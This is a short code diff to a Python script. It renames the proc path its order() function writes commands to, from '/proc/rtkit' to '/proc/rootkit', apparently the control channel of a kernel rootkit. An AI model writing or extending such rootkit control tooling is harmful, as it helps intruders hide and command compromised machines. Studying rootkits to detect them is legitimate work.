@@ -3,7 +3,7 @@ import sys
 import os
 
 def order(command):
-    f = open("/proc/rtkit", "w")
+    f = open("/proc/rootkit", "w")
     f.write(command)
     f.close()
 
